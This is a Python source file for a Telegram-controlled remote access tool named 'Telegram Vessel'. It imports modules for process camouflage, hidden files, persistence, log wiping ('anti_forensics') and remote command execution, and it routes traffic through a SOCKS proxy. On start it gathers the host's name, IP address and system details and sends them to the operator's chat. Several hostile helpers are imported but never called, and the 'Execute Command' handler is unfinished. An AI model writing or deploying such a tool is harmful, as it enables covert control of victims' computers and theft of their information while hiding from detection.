#!/usr/bin/env python
# pylint: disable=unused-argument
# This program is dedicated to the public domain under the CC0 license.

import logging
import platform
import socket
from typing import Dict
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    PicklePersistence,
    filters,
    CallbackContext,
)
from telegram.request import HTTPXRequest
from utils.camouflage import set_process_name, hide_file
from utils.persistence import setup_persistence, random_start_delay
from utils.execution import handle_telegram_commands, send_to_telegram
from utils.anti_forensics import clear_logs
from utils.seed_management import plant_seeds, check_seed_activation
from utils.logging import log_info, log_warning, log_error, log_debug, log_critical
from utils.config import BOT_TOKEN, SOCKS_PROXY, ENABLE_CAMOUFLAGE, ENABLE_PERSISTENCE, ENABLE_SEEDS, ENABLE_ANTI_FORENSICS
import httpx

# Define conversation states
CHOOSING, TYPING_REPLY, TYPING_CHOICE = range(3)

# Setup logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

reply_keyboard = [
    ["System Info", "Execute Command"],
    ["Enable Camouflage", "Disable Camouflage"],
    ["Done"],
]
markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True)

# Create the Request object with SOCKS proxy if provided
try:
    request = HTTPXRequest(proxy=SOCKS_PROXY) if SOCKS_PROXY else None
    log_info(f"Using proxy: {SOCKS_PROXY}" if SOCKS_PROXY else "No proxy configured.")
except Exception as e:
    log_critical(f"Error setting up proxy: {e}")
    request = None

# Initialize the bot Application
try:
    persistence = PicklePersistence(filepath="telegram_vessel")
    application = Application.builder().token(BOT_TOKEN).request(request).persistence(persistence).build()
    log_info("Bot initialized.")
except httpx.HTTPStatusError as e:
    log_critical(f"HTTP error occurred: {e.response.status_code} - {e.response.text}")
except httpx.RequestError as e:
    log_critical(f"Request error occurred: {e}")
except httpx.ReadTimeout as e:
    log_critical(f"Read timeout occurred: {e}")
except Exception as e:
    log_critical(f"An unexpected error occurred: {e}")
    raise

def gather_system_info() -> Dict[str, str]:
    """Gathers basic system information."""
    system_info = {
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Architecture": platform.machine(),
        "Processor": platform.processor(),
        "Python Version": platform.python_version(),
    }
    return system_info

async def send_system_info(context: CallbackContext) -> None:
    """Sends the system information to the Telegram bot."""
    chat_id = context.job.context  # Retrieve chat_id from the job context
    info = gather_system_info()
    log_info(f"System Info: {info}")
    message = (
        f"🔔 *Telegram Vessel is now running*\n\n"
        f"*Hostname:* {info['Hostname']}\n"
        f"*IP Address:* {info['IP Address']}\n"
        f"*OS:* {info['OS']} {info['OS Version']}\n"
        f"*Architecture:* {info['Architecture']}\n"
        f"*Processor:* {info['Processor']}\n"
        f"*Python Version:* {info['Python Version']}"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
    log_info("System information sent to the user.")
    send_to_telegram(message)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the conversation and send system info."""
    user = update.effective_user
    chat_id = update.effective_chat.id  # Get the chat ID from the update

    log_info(f"Received /start command from user: {user.username} in chat {chat_id}")

    await update.message.reply_text(
        "Hi! I'm ready to assist you. What would you like to do?",
        reply_markup=markup,
    )

    # Schedule system info to be sent immediately
    context.job_queue.run_once(send_system_info, 1, chat_id=chat_id)

    return CHOOSING

# Other command handlers and the main function would follow the same pattern

async def done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """End the conversation."""
    await update.message.reply_text(
        "Goodbye! Use /start to begin again.", reply_markup=ReplyKeyboardRemove()
    )
    return ConversationHandler.END

def main() -> None:
    """Run the bot."""
    # Create the Application and pass it your bot's token.
    persistence = PicklePersistence(filepath="telegram_vessel")
    application = Application.builder().token(BOT_TOKEN).request(request).persistence(persistence).build()

    # Add conversation handler with the states CHOOSING, TYPING_CHOICE, and TYPING_REPLY
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSING: [
                MessageHandler(filters.Regex("^(System Info|Execute Command)$"), start),
            ],
            TYPING_REPLY: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, start),
            ],
        },
        fallbacks=[CommandHandler("done", done)],
        name="my_conversation",
        persistent=True,
    )

    application.add_handler(conv_handler)

    # Run the bot until the user presses Ctrl-C
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
